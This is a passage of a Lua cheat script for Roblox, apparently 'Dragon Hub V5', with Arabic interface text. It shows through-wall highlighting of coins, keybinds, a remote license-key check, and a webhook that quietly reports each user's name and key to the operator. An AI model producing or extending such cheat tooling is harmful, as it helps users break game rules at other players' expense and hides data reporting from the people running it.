                    if o:IsA("BasePart") and o.Parent ~= LocalPlayer.Character then
                        local nm = o.Name:lower()
                        if nm:find("coin") or nm:find("cash") then
                            if not o:FindFirstChild("DH5_Coin") then
                                local h = Instance.new("Highlight", o)
                                h.Name = "DH5_Coin"
                                h.FillColor = Config.CoinESPColor
                                h.OutlineColor = Color3.fromRGB(255,255,255)
                                h.FillTransparency = 0.5
                                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            end
                        end
                    end
                end
            end
        end
    end)

    -- KEYBINDS
    UserInputService.InputBegan:Connect(function(input, p)
        if p then return end
        if input.KeyCode == Enum.KeyCode.RightShift then
            if isOpen then CloseUI() else OpenUI() end
        end
        if input.KeyCode == Enum.KeyCode.RightControl then ScreenGui:Destroy() end
        if input.KeyCode == Enum.KeyCode.Insert then OpenUI() end
    end)

    task.wait(0.3)
    Notify("Dragon Hub V5", "✓ Aura Loaded!", 4)
    Notify("🛡️ Guardian", "8 Layers Protection Active", 5, Color3.fromRGB(100, 255, 150))
    SendWebhook("🐉 **Dragon Hub V5 Aura Loaded**\nUser: `" .. LocalPlayer.Name .. "`\nKey: `" .. tostring(Config.ActiveKey) .. "`")

    task.spawn(function()
        while task.wait(60) do SaveConfig() end
    end)
end

-- ═════════════════════════════════════════════════════════════════════════════
-- [14] START — Auto-Login مع المفتاح المحفوظ
-- ═════════════════════════════════════════════════════════════════════════════

local function ShowKeyUIAndWait()
    local KF, KB, SB, SL = CreateKeyUI()
    local function Submit()
        local input = KB.Text
        if input == "" then
            SL.Text = "⚠️ أدخل المفتاح"
            SL.TextColor3 = Color3.fromRGB(240, 180, 60)
            return
        end
        SL.Text = "⏳ جاري التحقق..."
        SL.TextColor3 = Color3.fromRGB(150, 200, 255)
        SB.Text = "⏳ جاري التحقق..."
        task.spawn(function()
            local ok, info = ValidateRemotely(input)
            if ok then
                Config.ActiveKey = input
                Config.KeyExpireTime = info.expire
                Config.KeyLabel = info.label
                SaveKeyFile(input, info.expire)
                SL.Text = "✅ مفتاح صحيح! (" .. info.label .. ")"
                SL.TextColor3 = Color3.fromRGB(100, 220, 150)
                SB.Text = "✅ تم!"
                task.wait(0.8)
                local kf = ScreenGui:FindFirstChild("KeyFrame")
                if kf then kf:Destroy() end
                LoadConfig()
                BuildHub()
            else
                SL.Text = "❌ " .. tostring(info)
                SL.TextColor3 = Color3.fromRGB(240, 80, 90)
                SB.Text = "🔓 تحقق ودخول"
            end
        end)
    end
    SB.MouseButton1Click:Connect(Submit)
    KB.FocusLost:Connect(function(e) if e then Submit() end end)
end

local sk, se = LoadKeyFile()
if sk and se and se > os.time() then
    task.spawn(function()
        local ok, info = ValidateRemotely(sk)
        if ok then
            Config.ActiveKey = sk
            Config.KeyExpireTime = info.expire
            Config.KeyLabel = info.label
            LoadConfig()
            BuildHub()
        else
            ClearKeyFile()
            ShowKeyUIAndWait()
        end
    end)
else
    ClearKeyFile()
    ShowKeyUIAndWait()
end
